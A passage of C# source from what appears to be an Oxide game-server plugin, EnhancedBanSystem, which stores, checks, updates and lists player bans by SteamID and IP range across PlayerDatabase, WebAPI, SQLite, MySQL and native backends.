            public HashSet<string> Banlist = new HashSet<string>();
        }

        string PlayerDatabase_Load()
        {
            if (!IsPluginLoaded(PlayerDatabase)) return FormatReturn(BanSystem.PlayerDatabase, "Missing plugin: oxidemod.org/threads/playerdatabase.18409/");

            try
            {
                storedIPData = Interface.Oxide.DataFileSystem.ReadObject<StoredIPData>(PlayerDatabase_IPFile);
            }
            catch
            {
                storedIPData = new StoredIPData();
            }

            if (storedIPData.Banlist.Count > 0)
            {
                foreach (var b in storedIPData.Banlist)
                {
                    var bd = JsonConvert.DeserializeObject<BanData>(b);
                    if (!cachedBans.ContainsKey(bd.id))
                        cachedBans.Add(bd.id, bd);
                }
            }
            var getKnownPlayers = (List<string>)PlayerDatabase.Call("GetAllKnownPlayers");
            if (getKnownPlayers == null) return FormatReturn(BanSystem.PlayerDatabase, "Error P01");

            int i = 0;
            List<BanData> list = new List<BanData>();
            foreach (var steamid in getKnownPlayers)
            {
                var success = PlayerDatabase.Call("GetPlayerDataRaw", steamid, "Banned");
                if (!(success is string)) continue;

                
                if (((string)success).Equals("System.Collections.Generic.List`1[Oxide.Plugins.EnhancedBanSystem+BanData]", StringComparison.Ordinal))
                {
                    list = new List<BanData>();
                }
                else
                {
                    list = JsonConvert.DeserializeObject<List<BanData>>((string)success);
                }

                foreach (var b in list)
                {
                    i++;
                    if (!cachedBans.ContainsKey(b.id))
                        cachedBans.Add(b.id, b);
                }
            }
            return FormatReturn(BanSystem.PlayerDatabase, GetMsg("LoadedBans"), i.ToString());
        }

        void Save_PlayerDatabaseIP()
        {
            Interface.Oxide.DataFileSystem.WriteObject(PlayerDatabase_IPFile, storedIPData);
        }


        string PlayerDatabase_ExecuteBan(BanData bandata)
        {
            if (bandata.steamid != string.Empty)
            {
                List<BanData> list = new List<BanData>();
                var success = PlayerDatabase.Call("GetPlayerDataRaw", bandata.steamid, "Banned");
                if (success is string)
                {
                    list = JsonConvert.DeserializeObject<List<BanData>>((string)success);
                }

                var f = list.Where(x => x.ip == bandata.ip).ToList();
                if (f.Count > 0)
                {
                    return FormatReturn(BanSystem.PlayerDatabase, GetMsg("BanExists"), f[0].ToString());
                }
                f.Add(bandata);
                PlayerDatabase.Call("SetPlayerData", bandata.steamid, "Banned", f, true);
            }
            else
            {
                var f2 = cachedBans.Values.Where(x => x.ip == bandata.ip).Where(x => x.steamid == string.Empty).ToList();
                if (f2.Count > 0)
                {
                    return FormatReturn(BanSystem.PlayerDatabase, GetMsg("BanExists"), f2[0].ToString());
                }
                storedIPData.Banlist.Add(bandata.ToJson());
            }
            if (!cachedBans.ContainsKey(bandata.id))
                cachedBans.Add(bandata.id, bandata);
            return FormatReturn(BanSystem.PlayerDatabase, GetMsg("BanAdded"), bandata.ToString());
        }

        string PlayerDatabase_UpdateBan(BanData bandata, double expire)
        {
            if (bandata.steamid == string.Empty)
            {
                if (cachedBans.ContainsKey(bandata.id))
                {
                    var json = bandata.ToJson();
                    if (storedIPData.Banlist.Contains(json))
                    {
                        cachedBans.Remove(bandata.id);
                        storedIPData.Banlist.Remove(json);
                        bandata.expire = expire;
                        storedIPData.Banlist.Add(bandata.ToJson());
                        cachedBans.Add(bandata.id, bandata);
                        return FormatReturn(BanSystem.Files, GetMsg("BanUpdated"), bandata.ToString());
                    }
                }
            }
            else
            {
                List<BanData> list = new List<BanData>();
                bandata.expire = expire;
                var b_steamid = PlayerDatabase.Call("GetPlayerDataRaw", bandata.steamid, "Banned");
                if (b_steamid is string)
                {
                    list = JsonConvert.DeserializeObject<List<BanData>>((string)b_steamid);
                }
                if (list.Count > 0)
                {
                    foreach (var b in list)
                    {
                        b.expire = expire;
                    }
                    PlayerDatabase.Call("SetPlayerData", bandata.steamid, "Banned", list, true);
                    return FormatReturn(BanSystem.Files, GetMsg("BanUpdated"), bandata.ToString());
                }
            }
            return string.Empty;
        }

        string PlayerDatabase_RawUnban(List<BanData> unbanList)
        {
            int i = 0;
            foreach (var u in unbanList)
            {
                if (u.steamid == string.Empty)
                {
                    var json = u.ToJson();
                    if (storedIPData.Banlist.Contains(json))
                    {
                        i++;
                        storedIPData.Banlist.Remove(json);
                    }
                }
                else
                {
                    i++;
                    PlayerDatabase.Call("SetPlayerData", u.steamid, "Banned", new List<BanData>(), true);
                }
            }
            return FormatReturn(BanSystem.PlayerDatabase, GetMsg("BansRemoved"), i.ToString());
        }

        string PlayerDatabase_ExecuteUnban(string steamid, string name, string ip, out List<BanData> unbanList)
        {
            unbanList = new List<BanData>();
            if (ip != string.Empty)
            {
                unbanList = cachedBans.Values.Where(x => x.ip == ip).ToList();
            }
            else if (steamid != string.Empty)
            {
                unbanList = cachedBans.Values.Where(x => x.steamid == steamid).ToList();
            }
            else
            {
                unbanList = cachedBans.Values.Where(x => x.name == name).ToList();
                if (unbanList.Count == 0)
                {
                    var lname = name.ToLower();
                    unbanList = cachedBans.Values.Where(x => x.name.ToLower().Contains(lname)).ToList();
                    if (unbanList.Count > 1)
                    {
                        var ret = FormatReturn(BanSystem.PlayerDatabase, GetMsg("MultipleBans"));
                        foreach (var b in unbanList)
                        {
                            ret += string.Format("{0} - {1} - {2}\n\r", b.steamid, b.name, b.reason);
                        }
                        return ret;
                    }
                }
            }
            return PlayerDatabase_RawUnban(unbanList);
        }

        bool PlayerDatabase_IsBanned(string steamid, string ip, out BanData bandata)
        {
            bandata = null;
            BanData possibleData = null;
            double cTime = LogTime();
            bool permanent = false;
            List<BanData> unbanList = new List<BanData>();
            List<BanData> list = new List<BanData>();
            // check by ID then IP
            var b_steamid = PlayerDatabase.Call("GetPlayerDataRaw", steamid, "Banned");
            if (b_steamid is string)
            {
                list = JsonConvert.DeserializeObject<List<BanData>>((string)b_steamid);
            }
            foreach (var b in list)
            {
                if (b.expire != 0.0 && cTime >= b.expire)
                {
                    unbanList.Add(b);
                }
                else
                {
                    if (b.expire == 0.0)
                    {
                        permanent = true;
                    }
                    if (b.ip == ip)
                    {
                        bandata = b;
                    }
                }
            }
            if (unbanList.Count > 0)
            {
                PlayerDatabase_RawUnban(unbanList);
                foreach (var b in unbanList)
                {
                    list.Remove(b);
                }
                unbanList.Clear();
            }

            if (list.Count > 0 && bandata == null)
            {
                possibleData = list[0];
            }
            // check by IP & IP Range
            list = ip != null ? cachedBans.Values.Where(x => x.ip != null && IPRange(x.ip, ip)).ToList() : new List<BanData>();
            foreach (var b in list)
            {
                if (b.expire != 0.0 && cTime >= b.expire)
                {
                    unbanList.Add(b);
                }
                else
                {
                    if (b.expire == 0.0)
                    {
                        permanent = true;
                    }
                }
            }
            if (unbanList.Count > 0)
            {
                PlayerDatabase_RawUnban(unbanList);
                foreach (var b in unbanList)
                {
                    list.Remove(b);
                }
                unbanList.Clear();
            }
            if (list.Count > 0 && bandata == null && possibleData == null)
            {
                possibleData = list[0];
            }
            if (bandata == null && possibleData != null)
            {
                bandata = possibleData;
            }
            if (bandata != null && bandata.expire != 0.0 && permanent)
            {
                PlayerDatabase_UpdateBan(bandata, 0.0);
            }
            return bandata != null;
        }

        string PlayerDatabase_Banlist(object source, int startid)
        {
            if (startid > cachedBans.Count)
            {
                return FormatReturn(BanSystem.PlayerDatabase, GetMsg("OutOfRange"), cachedBans.Count.ToString());
            }

            int i = -1;
            int max = startid + 9;

            string returnstring = FormatReturn(BanSystem.PlayerDatabase, GetMsg("Banlist"), startid.ToString(), max.ToString(), cachedBans.Count.ToString());


            var bans = from pair in cachedBans orderby pair.Key descending select pair;

            foreach (KeyValuePair<int, BanData> b in bans)
            {
                i++;
                if (i < startid) continue;
                if (i > max) break;
                returnstring += b.ToString() + "\n";

            }

            return returnstring;
        }

        ////////////////////////////////////////////////////////////
        // WebAPI
        ////////////////////////////////////////////////////////////

        string FormatOnlineBansystem(string line, Dictionary<string, string> args)
        {
            foreach (KeyValuePair<string, string> pair in args)
            {
                line = line.Replace(pair.Key, pair.Value);
            }
            return line;
        }

        string WebAPI_ExecuteBan(object source, BanData bandata)
        {
            webrequest.Enqueue(FormatOnlineBansystem(WebAPI_Ban_Request, new Dictionary<string, string> { { "{id}", bandata.id.ToString() }, { "{steamid}", bandata.steamid }, { "{name}", bandata.name }, { "{ip}", bandata.ip }, { "{reason}", bandata.reason }, { "{source}", bandata.source }, { "{expiration}", bandata.expire.ToString() }, { "{game}", bandata.game }, { "{platform}", bandata.platform }, { "{server}", bandata.server } }), null, (code, response) =>
            {
                if (response == null && code == 200)
                {
                    response = FormatReturn(BanSystem.WebAPI, "Couldn't contact the WebAPI");
                }
                if (source is IPlayer) ((IPlayer)source).Reply(response);
                else Interface.Oxide.LogInfo(response);
            }, this);


            return string.Empty;
        }

        string WebAPI_ExecuteUnban(object source, string steamid, string name, string ip)
        {
            webrequest.Enqueue(FormatOnlineBansystem(WebAPI_Unban_Request, new Dictionary<string, string> { { "{steamid}", steamid }, { "{name}", name }, { "{ip}", ip } }), null, (code, response) =>
            {
                if (response == null && code == 200)
                {
                    response = FormatReturn(BanSystem.WebAPI, "Couldn't contact the WebAPI");
                }
                if (source is IPlayer) ((IPlayer)source).Reply(response);
                else Interface.Oxide.LogInfo(response);
            }, this);

            return string.Empty;
        }

        string WebAPI_IsBanned(BanData bandata, bool update)
        {
            webrequest.Enqueue(FormatOnlineBansystem(WebAPI_IsBanned_Request, new Dictionary<string, string> { { "{id}", bandata.id.ToString() }, { "{steamid}", bandata.steamid }, { "{name}", bandata.name }, { "{ip}", bandata.ip }, { "{source}", "Auto Ban" }, { "{update}", update.ToString() }, { "{time}", LogTime().ToString() } }), null, (code, response) =>
            {
                if (response != null || code != 200)
                {
                    if (response == "false" || response == "0")
                        return;
                    timer.Once(0.01f, () => Kick(null, bandata.steamid, response == "true" || response == "1" ? "Banned" : response, false));
                }
                else
                {
                    Interface.Oxide.LogWarning("WebAPI couldn't be contacted or is not valid");
                }
            }, this);

            return string.Empty;
        }

        string WebAPI_Banlist(object source, int startid)
        {
            webrequest.Enqueue(FormatOnlineBansystem(WebAPI_Banlist_Request, new Dictionary<string, string> { { "{startid}", startid.ToString() } }), null, (code, response) =>
            {
                if (response != null || code != 200)
                {
                    SendReply(source, response);
                }
            }, this);

            return string.Empty;
        }

        string WebAPI_Load()
        {
            return FormatReturn(BanSystem.WebAPI, GetMsg("Loaded"));
        }

        ////////////////////////////////////////////////////////////
        // SQLite
        ////////////////////////////////////////////////////////////

        SQLite Sqlite = Interface.Oxide.GetLibrary<SQLite>();
        Connection Sqlite_conn;

        string SQLite_Load()
        {
            var returnstring = string.Empty;
            try
            {
                Sqlite_conn = Sqlite.OpenDb(SQLite_DB, this);
                if (Sqlite_conn == null)
                {
                    returnstring = FormatReturn(BanSystem.SQLite, "Couldn't open the SQLite.");
                }
                else
                {
                    Sqlite.Insert(Core.Database.Sql.Builder.Append("CREATE TABLE IF NOT EXISTS EnhancedBanSystem ( id INTEGER NOT NULL PRIMARY KEY UNIQUE, steamid TEXT, name TEXT, ip TEXT, reason TEXT, source TEXT, game TEXT, platform TEXT, server TEXT, expire INTEGER );"), Sqlite_conn);
                    returnstring = FormatReturn(BanSystem.SQLite, GetMsg("Loaded"));
                }
            }
            catch (Exception e)
            {
                returnstring = e.Message;
            }
            return FormatReturn(BanSystem.SQLite, returnstring);
        }


        string SQLite_RawBan(BanData bandata)
        {
            try
            {
                Sqlite.Insert(Core.Database.Sql.Builder.Append("INSERT OR REPLACE INTO EnhancedBanSystem ( id, steamid, name, ip, reason, source, game, platform, server, expire ) VALUES ( @0, @1, @2, @3, @4, @5, @6, @7, @8, @9 )", bandata.id, bandata.steamid, bandata.name, bandata.ip, bandata.reason, bandata.source, bandata.game, bandata.platform, bandata.server, (int)bandata.expire), Sqlite_conn);
            }
            catch (Exception e)
            {
                return e.Message;
            }
            return FormatReturn(BanSystem.SQLite, GetMsg("BanAdded"), bandata.ToString());
        }

        string SQLite_ExecuteBan(object source, BanData bandata)
        {
            var sqlString = bandata.steamid == string.Empty ? Core.Database.Sql.Builder.Append("SELECT * from EnhancedBanSystem WHERE `ip` == @0 ", bandata.ip) : Core.Database.Sql.Builder.Append("SELECT * from EnhancedBanSystem WHERE `steamid` == @0 AND `ip` == @1 ", bandata.steamid, bandata.ip);

            Sqlite.Query(sqlString, Sqlite_conn, list =>
            {
                if (list != null)
                {
                    foreach (var entry in list)
                    {
                        var bd = new BanData(int.Parse(entry["id"].ToString()), (string)entry["source"], (string)entry["steamid"], (string)entry["name"], (string)entry["ip"], (string)entry["reason"], entry["expire"].ToString());
                        var response = FormatReturn(BanSystem.SQLite, GetMsg("BanExists"), bd.ToString());
                        SendReply(source, response);
                        return;
                    }
                }
                var reponse2 = SQLite_RawBan(bandata);
                if (source is IPlayer) ((IPlayer)source).Reply(reponse2);
                else Interface.Oxide.LogInfo(reponse2);
            });

            return string.Empty;
        }

        void SQLite_RawUnban(object source, List<long> unbanList)
        {
            foreach (var id in unbanList)
            {
                Sqlite.Insert(Core.Database.Sql.Builder.Append("DELETE from EnhancedBanSystem WHERE `id` = @0", id), Sqlite_conn);
            }
            var returnstring = FormatReturn(BanSystem.SQLite, GetMsg("BansRemoved"), unbanList.Count.ToString());
            SendReply(source, returnstring);
        }

        string SQLite_ExecuteUnban(object source, string steamid, string name, string ip)
        {
            List<long> unbanList = new List<long>();
            if (ip != string.Empty || steamid != string.Empty)
            {
                var sqlString = ip != string.Empty ? Core.Database.Sql.Builder.Append("SELECT * from EnhancedBanSystem WHERE `ip` == @0 ", ip) : Core.Database.Sql.Builder.Append("SELECT * from EnhancedBanSystem WHERE `steamid` == @0", steamid);
                Sqlite.Query(sqlString, Sqlite_conn, list =>
                {
                    if (list != null)
                    {
                        foreach (var entry in list)
                        {
                            unbanList.Add((long)entry["id"]);
                        }
                    }
                    SQLite_RawUnban(source, unbanList);
                });
            }
            else
            {
                Sqlite.Query(Core.Database.Sql.Builder.Append("SELECT * from EnhancedBanSystem WHERE `name` LIKE @0", "%" + name + "%"), Sqlite_conn, list =>
                {
                    List<Dictionary<string, object>> f = new List<Dictionary<string, object>>();
                    if (list != null)
                    {
                        foreach (var entry in list)
                        {
                            f.Add(entry);
                            unbanList.Add((long)entry["id"]);
                        }
                    }
                    if (unbanList.Count > 1)
                    {
                        var ret = FormatReturn(BanSystem.SQLite, GetMsg("MultipleBans"));
                        foreach (var e in f)
                        {
                            ret += string.Format("{0} - {1} - {2}\n\r", (string)e["steamid"], (string)e["name"], (string)e["reason"]);
                        }
                        if (source is IPlayer) ((IPlayer)source).Reply(ret);
                        else Interface.Oxide.LogInfo(ret);
                        return;
                    }
                    SQLite_RawUnban(source, unbanList);
                });
            }
            return string.Empty;
        }

        void SQLite_UpdateBan(BanData bandata)
        {
            Sqlite.Insert(Core.Database.Sql.Builder.Append("UPDATE EnhancedBanSystem SET `steamid`= @1, `name`= @2, `ip`= @3,`reason`= @4,`source`=@5, `game`= @6, `platform`= @7,`server`= @8, `expire`= @9 WHERE `id` = @0", bandata.id, bandata.steamid, bandata.name, bandata.ip, bandata.reason, bandata.source, bandata.game, bandata.platform, bandata.server, (int)bandata.expire), Sqlite_conn);
        }

        void SQLite_IsBanned(BanData bandata, bool update)
        {
            bandata.reason = BanEvadeReason;

            double cTime = LogTime();
            List<long> unbanList = new List<long>();
            Dictionary<string, object> match = new Dictionary<string, object>();

            Sqlite.Query(Core.Database.Sql.Builder.Append("SELECT * from EnhancedBanSystem WHERE `steamid` == @0", bandata.steamid), Sqlite_conn, list =>
            {

                var l = new List<Dictionary<string, object>>();
                if (list != null)
                {
                    foreach (var entry in list)
                    {
                        var expire = (long)entry["expire"];
                        if (expire != 0.0 && cTime >= expire)
                        {
                            unbanList.Add((long)entry["id"]);
                        }
                        else
                        {
                            if ((string)entry["ip"] == bandata.ip)
                            {
                                match = entry;
                            }
                            l.Add(entry);
                        }
                    }
                }
                if (unbanList.Count > 0)
                {
                    SQLite_RawUnban("Auto Ban", unbanList);
                    unbanList.Clear();
                }
                var l2 = l.Where(x => (long)x["expire"] == 0L).ToList();
                if (l2.Count == 0)
                {
                    string range1;
                    string range2;
                    string range3;
                    if (RangeFromIP(bandata.ip, out range1, out range2, out range3))
                    {
                        Sqlite.Query(Core.Database.Sql.Builder.Append("SELECT * from EnhancedBanSystem WHERE `ip` == @0 OR `ip` == @1 OR `ip` == @2 OR `ip` == @3", bandata.ip, range1, range2, range3), Sqlite_conn, list2 =>
                        {
                            if (list2 != null)
                            {
                                foreach (var entry in list2)
                                {
                                    var expire = (long)entry["expire"];
                                    if (expire != 0.0 && cTime >= expire)
                                    {
                                        unbanList.Add((long)entry["id"]);
                                    }
                                    else
                                    {
                                        if (!l.Contains(entry))
                                            l.Add(entry);
                                    }
                                }
                            }
                            if (l.Count > 0)
                            {
                                l2 = l.Where(x => (long)x["expire"] == 0L).ToList();
                                bandata.expire = l2.Count > 0 ? 0.0 : match.ContainsKey("expire") ? (long)(match["expire"]) : (long)(l[0]["expire"]);
                                if (match.ContainsKey("expire"))
                                {
                                    if ((long)(match["expire"]) != bandata.expire)
                                    {
                                        var bd = new BanData(int.Parse(match["id"].ToString()), (string)match["source"], (string)match["steamid"], (string)match["name"], (string)match["ip"], (string)match["reason"], match["expire"].ToString());
                                        bd.expire = bandata.expire;
                                        SQLite_UpdateBan(bd);
                                    }
                                }
                                else if (update) ExecuteBan("Auto Ban", bandata, false);
                                timer.Once(0.1f, () => Kick(null, bandata.steamid, match.ContainsKey("reason") ? (string)match["reason"] : (string)l[0]["reason"], false));
                            }
                        });
                    }
                }
                if (l.Count > 0)
                {
                    bandata.expire = l2.Count > 0 ? 0.0 : match.ContainsKey("expire") ? (long)(match["expire"]) : (long)(l[0]["expire"]);
                    if (match.ContainsKey("expire"))
                    {
                        if ((long)(match["expire"]) != bandata.expire)
                        {
                            var bd = new BanData(int.Parse(match["id"].ToString()), (string)match["source"], (string)match["steamid"], (string)match["name"], (string)match["ip"], (string)match["reason"], match["expire"].ToString());
                            SQLite_UpdateBan(bd);
                        }
                    }
                    else if (update) ExecuteBan("Auto Ban", bandata, false);
                    timer.Once(0.1f, () => Kick(null, bandata.steamid, match.ContainsKey("reason") ? (string)match["reason"] : (string)l[0]["reason"], false));
                }
            });
        }

        string SQLite_Banlist(object source, int startid)
        {
            Sqlite.Query(Core.Database.Sql.Builder.Append("SELECT * from EnhancedBanSystem ORDER BY id DESC"), Sqlite_conn, list =>
            {
                int i = -1;
                int max = startid + 9;
                string replystring = string.Empty;
                if (list != null)
                {
                    replystring += FormatReturn(BanSystem.SQLite, GetMsg("Banlist"), startid.ToString(), max.ToString(), list.Count.ToString());
                    foreach (var entry in list)
                    {
                        i++;
                        if (i < startid) continue;
                        if (i > max) break;
                        var bd = new BanData(int.Parse(entry["id"].ToString()), (string)entry["source"], (string)entry["steamid"], (string)entry["name"], (string)entry["ip"], (string)entry["reason"], entry["expire"].ToString());
                        replystring += bd.ToString() + "\n";
                    }
                    SendReply(source, replystring);
                }
            });
            return string.Empty;
        }

        ////////////////////////////////////////////////////////////
        // MySQL
        ////////////////////////////////////////////////////////////

        Oxide.Core.MySql.Libraries.MySql Sql = Interface.Oxide.GetLibrary<Oxide.Core.MySql.Libraries.MySql>();
        Connection Sql_conn;

        string MySQL_Load()
        {
            try
            {
                Sql_conn = Sql.OpenDb(MySQL_Host, MySQL_Port, MySQL_DB, MySQL_User, MySQL_Pass, this);
                if (Sql_conn == null || Sql_conn.Con == null)
                {
                    return FormatReturn(BanSystem.MySQL, "Couldn't open the MySQL PlayerDatabase: {0} ", Sql_conn.Con.State.ToString());
                }
                else
                {
                    Sql.Insert(Core.Database.Sql.Builder.Append("CREATE TABLE IF NOT EXISTS enhancedbansystem ( `id` int(11) NOT NULL, `steamid` VARCHAR(17),`name` VARCHAR(25),`ip` VARCHAR(15),`reason` VARCHAR(25),`source` VARCHAR(25), `game` VARCHAR(25) , `platform` VARCHAR(25), `server` VARCHAR(25), `expire` int(11) );"), Sql_conn);
                    return FormatReturn(BanSystem.MySQL, GetMsg("Loaded"));
                }
            }
            catch (Exception e)
            {
                return FormatReturn(BanSystem.MySQL, e.Message);
            }
        }

        string MySQL_RawBan(BanData bandata)
        {
            try
            {
                Sql.Insert(Core.Database.Sql.Builder.Append("INSERT IGNORE INTO enhancedbansystem ( `id`, `steamid`,`name`,`ip`,`reason`,`source`,`game`,`platform`, `server`, `expire` ) VALUES ( @0, @1, @2, @3, @4, @5, @6, @7, @8, @9 )", bandata.id, bandata.steamid, bandata.name, bandata.ip, bandata.reason, bandata.source, bandata.game, bandata.platform, bandata.server, (int)bandata.expire), Sql_conn);
            }
            catch (Exception e)
            {
                return e.Message;
            }
            return FormatReturn(BanSystem.MySQL, GetMsg("BanAdded"), bandata.ToString());
        }

        void MySQL_UpdateBan(BanData bandata)
        {
            Sql.Insert(Core.Database.Sql.Builder.Append("UPDATE EnhancedBanSystem SET `steamid`= @1, `name`= @2, `ip`= @3,`reason`= @4,`source`=@5, `game`= @6, `platform`= @7,`server`= @8, `expire`= @9 WHERE `id` = @0", bandata.id, bandata.steamid, bandata.name, bandata.ip, bandata.reason, bandata.source, bandata.game, bandata.platform, bandata.server, (int)bandata.expire), Sqlite_conn);
        }

        void MySQL_RawUnban(object source, List<int> unbanList)
        {
            foreach (var id in unbanList)
            {
                Sql.Insert(Core.Database.Sql.Builder.Append("DELETE from enhancedbansystem WHERE `id` = @0", id), Sql_conn);
                if (BanSystemHasFlag(banSystem, BanSystem.Native))
                {
                    Native_ExecuteUnban(id.ToString(), null);
                }
            }
            SendReply(source, FormatReturn(BanSystem.MySQL, GetMsg("BansRemoved"), unbanList.Count.ToString()));
        }
        string MySQL_ExecuteBan(object source, BanData bandata)
        {
            var sqlString = bandata.steamid == string.Empty ? Core.Database.Sql.Builder.Append("SELECT * from enhancedbansystem WHERE `ip` = @0 ", bandata.ip) : Core.Database.Sql.Builder.Append("SELECT * from enhancedbansystem WHERE `steamid` = @0 AND `ip` = @1 ", bandata.steamid, bandata.ip);
            Sql.Query(sqlString, Sql_conn, list =>
            {
                if (list != null)
                {
                    foreach (var entry in list)
                    {
                        var bd = new BanData(int.Parse(entry["id"].ToString()), (string)entry["source"], (string)entry["steamid"], (string)entry["name"], (string)entry["ip"], (string)entry["reason"], entry["expire"].ToString());
                        var response = FormatReturn(BanSystem.MySQL, GetMsg("BanExists"), bd.ToString());
                        SendReply(source, response);
                        return;
                    }
                }
                SendReply(source, MySQL_RawBan(bandata));
            });
            return string.Empty;
        }

        string MySQL_ExecuteUnban(object source, string steamid, string name, string ip)
        {
            List<int> unbanList = new List<int>();
            if (ip != string.Empty || steamid != string.Empty)
            {
                var sqlString = ip != string.Empty ? Core.Database.Sql.Builder.Append("SELECT * from enhancedbansystem WHERE `ip` = @0 ", ip) : Core.Database.Sql.Builder.Append("SELECT * from enhancedbansystem WHERE `steamid` = @0", steamid);
                Sql.Query(sqlString, Sql_conn, list =>
                {
                    if (list != null)
                    {
                        foreach (var entry in list)
                        {
                            unbanList.Add((int)entry["id"]);
                        }
                    }
                    MySQL_RawUnban(source, unbanList);
                });
            }
            else
            {
                Sql.Query(Core.Database.Sql.Builder.Append("SELECT * from enhancedbansystem WHERE `name` LIKE @0", "%" + name + "%"), Sql_conn, list =>
                {
                    List<Dictionary<string, object>> f = new List<Dictionary<string, object>>();
                    if (list != null)
                    {
                        foreach (var entry in list)
                        {
                            f.Add(entry);
                            unbanList.Add((int)entry["id"]);
                        }
                    }
                    if (unbanList.Count > 1)
                    {
                        string ret = FormatReturn(BanSystem.MySQL, GetMsg("MultipleBans"));
                        foreach (var e in f)
                        {
                            ret += string.Format("{0} - {1} - {2}\n\r", (string)e["steamid"], (string)e["name"], (string)e["reason"]);
                        }
                        if (source is IPlayer) ((IPlayer)source).Reply(ret);
                        else Interface.Oxide.LogInfo(ret);
                        return;
                    }
                    else
                    {
                        MySQL_RawUnban(source, unbanList);
                    }
                });
            }
            return string.Empty;
        }

        void MySQL_IsBanned(BanData bandata, bool update)
        {
            bandata.reason = BanEvadeReason;

            List<int> unbanList = new List<int>();
            double cTime = LogTime();
            Dictionary<string, object> match = new Dictionary<string, object>();

            Sql.Query(Core.Database.Sql.Builder.Append("SELECT * from enhancedbansystem WHERE `steamid` = @0", bandata.steamid), Sql_conn, list =>
            {
                var l = new List<Dictionary<string, object>>();
                if (list != null)
                {
                    foreach (var entry in list)
                    {
                        var expire = (int)entry["expire"];
                        if (expire != 0 && cTime >= expire)
                        {
                            unbanList.Add((int)entry["id"]);
                        }
                        else
                        {
                            if ((string)entry["ip"] == bandata.ip)
                            {
                                match = entry;
                            }
                            l.Add(entry);
                        }
                    }
                }
                if (unbanList.Count > 0)
                {
                    MySQL_RawUnban("Auto Ban", unbanList);
                    unbanList.Clear();
                }
                var l2 = l.Where(x => (int)x["expire"] == 0).ToList();
                if (l2.Count == 0)
                {
                    string range1;
                    string range2;
                    string range3;
                    if (RangeFromIP(bandata.ip, out range1, out range2, out range3))
                    {
                        Sql.Query(Core.Database.Sql.Builder.Append("SELECT * from enhancedbansystem WHERE `ip` = @0 OR `ip` = @1 OR `ip` = @2 OR `ip` = @3", bandata.ip, range1, range2, range3), Sql_conn, list2 =>
                        {
                            if (list2 != null)
                            {
                                foreach (var entry in list2)
                                {
                                    var expire = (int)entry["expire"];
                                    if (expire != 0 && cTime >= double.Parse(expire.ToString()))
                                    {
                                        unbanList.Add((int)entry["id"]);
                                    }
                                    else
                                    {
                                        if (!l.Contains(entry))
                                            l.Add(entry);
                                    }
                                }
                            }
                            if (l.Count > 0)
                            {
                                bandata.expire = l2.Count > 0 ? 0.0 : match.ContainsKey("expire") ? (int)(match["expire"]) : (int)(l[0]["expire"]);
                                if (match.ContainsKey("expire"))
                                {
                                    if (double.Parse(match["expire"].ToString()) != bandata.expire)
                                    {
                                        var bd = new BanData(int.Parse(match["id"].ToString()), (string)match["source"], (string)match["steamid"], (string)match["name"], (string)match["ip"], (string)match["reason"], match["expire"].ToString());
                                        MySQL_UpdateBan(bd);
                                    }
                                }
                                else if (update) ExecuteBan("Auto Ban", bandata, false);
                                timer.Once(0.1f, () => Kick(null, bandata.steamid, match.ContainsKey("reason") ? (string)match["reason"] : (string)l[0]["reason"]));
                            }
                        });
                    }
                }
                if (l.Count > 0)
                {
                    bandata.expire = l2.Count > 0 ? 0.0 : match.ContainsKey("expire") ? double.Parse(match["expire"].ToString()) : double.Parse(l[0]["expire"].ToString());
                    if (match.ContainsKey("expire"))
                    {
                        if (double.Parse(match["expire"].ToString()) != bandata.expire)
                        {
                            var bd = new BanData(int.Parse(match["id"].ToString()), (string)match["source"], (string)match["steamid"], (string)match["name"], (string)match["ip"], (string)match["reason"], match["expire"].ToString());
                            MySQL_UpdateBan(bd);
                        }
                    }
                    else if (update) ExecuteBan("Auto Ban", bandata, false);
                    timer.Once(0.1f, () => Kick(null, bandata.steamid, match.ContainsKey("reason") ? (string)match["reason"] : (string)l[0]["reason"], false));
                }
            });
        }

        string MySQL_Banlist(object source, int startid)
        {
            Sql.Query(Core.Database.Sql.Builder.Append("SELECT * from enhancedbansystem ORDER BY id DESC"), Sql_conn, list =>
            {
                int i = -1;
                int max = startid + 9;
                string replystring = string.Empty;
                if (list != null)
                {
                    replystring += FormatReturn(BanSystem.MySQL, GetMsg("Banlist"), startid.ToString(), max.ToString(), list.Count.ToString());
                    foreach (var entry in list)
                    {
                        i++;
                        if (i < startid) continue;
                        if (i > max) break;
                        var bd = new BanData(int.Parse(entry["id"].ToString()), (string)entry["source"], (string)entry["steamid"], (string)entry["name"], (string)entry["ip"], (string)entry["reason"], entry["expire"].ToString());
                        replystring += bd.ToString() + "\n";

                    }
                    SendReply(source, replystring);
                }
            });
            return string.Empty;
        }

        ////////////////////////////////////////////////////////////
        // Native
        ////////////////////////////////////////////////////////////

        string Native_Load()
        {
            return FormatReturn(BanSystem.Native, GetMsg("Loaded"));
        }
        string Native_ExecuteBan(BanData bandata)
        {
            if (bandata.steamid.Length == 0) return FormatReturn(BanSystem.Native, "Can't ban by IP.");

            var player = players.FindPlayer(bandata.steamid);
            if (player == null) return FormatReturn(BanSystem.Native, GetMsg("PlayerNotFound"));
            if (player.IsBanned) return FormatReturn(BanSystem.Native, GetMsg("BanExists"), bandata.steamid.ToString());

            TimeSpan duration = bandata.expire == 0.0 ? default(TimeSpan) : TimeSpan.FromSeconds(bandata.expire);
            player.Ban(bandata.reason, duration);
#if RUST
            if (bandata.expire != 0.0)
            {
              return FormatReturn(BanSystem.Native, GetMsg("BanAdded"), bandata.steamid.ToString()) + "\nWARNING: NATIVE temporary bans are not supported in RUST! Temporary bans will stay permanent";
            }
#endif
            return FormatReturn(BanSystem.Native, GetMsg("BanAdded"), bandata.steamid.ToString());
        }

        string Native_ExecuteUnban(string steamid, string name)
        {
            if (steamid == string.Empty)
            {
                if (name == string.Empty) return string.Empty;
                var f = players.FindPlayers(name).Where(x => x.IsBanned).ToList();
                if (f.Count == 0)
                {
                    return FormatReturn(BanSystem.Native, GetMsg("PlayerNotFound"));
                }
                if (f.Count > 1)
                {
                    var ret = string.Empty;
                    foreach (var p in f)
                    {
                        ret += string.Format("{0} - {1}\n", p.Id, p.Name);
                    }
                    return ret;
                }
                steamid = f[0].Id;
            }
            var b = players.FindPlayer(steamid);
            if (b == null)
            {
                return FormatReturn(BanSystem.Native, GetMsg("PlayerNotFound"));
            }
            if (!b.IsBanned)
            {
                return FormatReturn(BanSystem.Native, GetMsg("PlayerNotBanned"), b.Id, b.Name);
            }
            b.Unban();
            return FormatReturn(BanSystem.Native, "1 matching bans were removed");
        }

        bool Native_IsBanned(string steamid)
        {
            var b = players.FindPlayer(steamid);
            if (b != null)
            {
                return b.IsBanned;
            }
            return false;
        }

        string Native_Banlist(object source, int startid)
        {
            int i = -1;
